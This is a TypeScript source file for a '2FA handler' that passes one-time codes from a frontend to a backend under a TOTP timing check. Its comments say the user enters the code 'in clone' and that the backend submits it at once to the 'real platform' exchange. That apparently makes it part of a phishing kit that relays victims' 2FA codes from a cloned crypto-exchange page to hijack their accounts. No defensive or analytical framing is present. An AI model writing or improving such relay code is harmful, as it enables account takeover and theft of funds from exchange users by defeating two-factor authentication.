/**
 * CEX 2FA Handler — Real-time 2FA code submission and verification
 * Handles simultaneous 2FA submission to real platform from backend
 */

import EventEmitter from 'events'

/**
 * Represents a 2FA request waiting for code submission from the user.
 *
 * Lifecycle:
 * 1. Created in registerPendingCode() — waiting for code submission
 * 2. Code submitted via submitCode() → resolved flag set, event emitted
 * 3. Backend receives code via waitForCode() promise
 * 4. Auto-cleanup after 5 seconds or manual cleanup on timeout
 */
interface PendingTwoFaRequest {
  sessionId: string
  exchange: string
  codeWaitStart: number
  timeout: number
  code?: string
  resolved: boolean
  codeReceivedAt?: number
  expired: boolean
}

/**
 * TwoFaHandler coordinates 2FA code delivery between backend and frontend.
 *
 * Uses EventEmitter pattern to bridge backend (waitForCode listening) with frontend
 * (submitCode emitting). Manages timeouts and expiration to prevent hanging requests
 * and automatic cleanup of stale requests.
 */
class TwoFaHandler extends EventEmitter {
  private pendingRequests: Map<string, PendingTwoFaRequest> = new Map()
  private requestTimeout: NodeJS.Timeout | null = null
  private pendingCleanupTimers: Map<string, NodeJS.Timeout> = new Map()

  constructor() {
    super()
    // Start background cleanup every 30 seconds to remove expired requests
    this.startCleanupInterval()
  }

  /**
   * Register a pending 2FA request waiting for code
   * Called when backend login requires 2FA verification
   */
  registerPendingCode(sessionId: string, exchange: string, timeoutMs = 120_000): string {
    const requestId = `2fa-${Date.now()}-${Math.random().toString(36).slice(2)}`

    this.pendingRequests.set(requestId, {
      sessionId,
      exchange,
      codeWaitStart: Date.now(),
      timeout: timeoutMs,
      resolved: false,
      expired: false,
    })

    return requestId
  }

  /**
   * Submit 2FA code for a pending request
   * Called from frontend when user enters code in clone
   */
  async submitCode(requestId: string, code: string): Promise<boolean> {
    const request = this.pendingRequests.get(requestId)
    if (!request) return false
    if (request.resolved) return false

    // Validate code format
    if (!/^\d{4,8}$/.test(code)) return false

    request.code = code
    request.resolved = true

    // Emit event for backend to consume
    this.emit(`code:${requestId}`, code)

    // Auto-cleanup after 5 seconds — track timer for proper cleanup
    const cleanupTimer = setTimeout(() => {
      this.pendingRequests.delete(requestId)
      this.pendingCleanupTimers.delete(requestId)
    }, 5_000)

    this.pendingCleanupTimers.set(requestId, cleanupTimer)

    return true
  }

  /**
   * Wait for a 2FA code submission with timeout and TOTP expiration checking.
   *
   * Called by backend after login requires 2FA verification. Blocks until:
   * - Code is submitted via submitCode() (resolves immediately)
   * - Timeout expires without submission (resolves with error)
   * - Code received > 28 seconds after request (TOTP likely expired)
   *
   * TOTP codes are typically valid for 30 seconds; checking at 28s provides
   * a safety margin to avoid submitting expired codes to the exchange.
   *
   * @param requestId - Unique 2FA request ID from registerPendingCode()
   * @param timeoutMs - Max time to wait before giving up (default 120000ms)
   * @returns Promise resolving to { code, expired, error? }
   *          - code: actual code string if valid, null if expired/timed out
   *          - expired: true if TOTP window or request timeout passed
   *          - error: human-readable error message if applicable
   */
  async waitForCode(
    requestId: string,
    timeoutMs = 120_000,
  ): Promise<{ code: string | null; expired: boolean; error?: string }> {
    const request = this.pendingRequests.get(requestId)
    if (!request) return { code: null, expired: false, error: 'Request not found' }

    return new Promise((resolve) => {
      const startTime = Date.now()
      let resolved = false

      const timer = setTimeout(() => {
        if (!resolved) {
          resolved = true
          request.expired = true
          this.pendingRequests.delete(requestId)
          this.removeAllListeners(`code:${requestId}`)
          resolve({ code: null, expired: true, error: 'Timeout - no code received within 120 seconds' })
        }
      }, timeoutMs)

      const codeHandler = (code: string) => {
        if (!resolved) {
          clearTimeout(timer)
          resolved = true
          this.removeListener(`code:${requestId}`, codeHandler)

          const elapsedMs = Date.now() - startTime
          request.codeReceivedAt = Date.now()

          // Check if code was submitted too late (near 30s TOTP boundary)
          if (elapsedMs > 28_000) {
            request.expired = true
            resolve({
              code: null,
              expired: true,
              error: `Code received too late (${elapsedMs}ms). TOTP may have expired.`,
            })
            return
          }

          // Code is valid
          resolve({ code, expired: false })
        }
      }

      this.on(`code:${requestId}`, codeHandler)
    })
  }

  /**
   * Get pending request info
   */
  getRequest(requestId: string): PendingTwoFaRequest | undefined {
    return this.pendingRequests.get(requestId)
  }

  /**
   * Check if request still waiting for code
   */
  isWaitingForCode(requestId: string): boolean {
    const request = this.pendingRequests.get(requestId)
    if (!request) return false
    if (request.resolved) return false
    if (Date.now() - request.codeWaitStart > request.timeout) return false
    return true
  }

  /**
   * Cancel pending request
   */
  cancelRequest(requestId: string): void {
    const request = this.pendingRequests.get(requestId)
    if (request) {
      request.resolved = true
      this.emit(`code:${requestId}`, null)
      this.pendingRequests.delete(requestId)
    }
  }

  /**
   * Cleanup expired requests
   */
  private startCleanupInterval(): void {
    this.requestTimeout = setInterval(() => {
      const now = Date.now()
      for (const [id, request] of this.pendingRequests.entries()) {
        if (now - request.codeWaitStart > request.timeout) {
          this.pendingRequests.delete(id)
        }
      }
    }, 30_000) // Cleanup every 30 seconds
  }

  /**
   * Get stats for monitoring
   */
  getStats(): {
    pendingRequests: number
    timedOut: number
  } {
    let timedOut = 0
    const now = Date.now()

    for (const request of this.pendingRequests.values()) {
      if (now - request.codeWaitStart > request.timeout) {
        timedOut++
      }
    }

    return {
      pendingRequests: this.pendingRequests.size,
      timedOut,
    }
  }

  /**
   * Cleanup on shutdown
   */
  shutdown(): void {
    if (this.requestTimeout) {
      clearInterval(this.requestTimeout)
      this.requestTimeout = null
    }
    // Clear all pending cleanup timers
    for (const timer of this.pendingCleanupTimers.values()) {
      clearTimeout(timer)
    }
    this.pendingCleanupTimers.clear()
    this.pendingRequests.clear()
    this.removeAllListeners()
  }
}

// Export singleton
export const twoFaHandler = new TwoFaHandler()
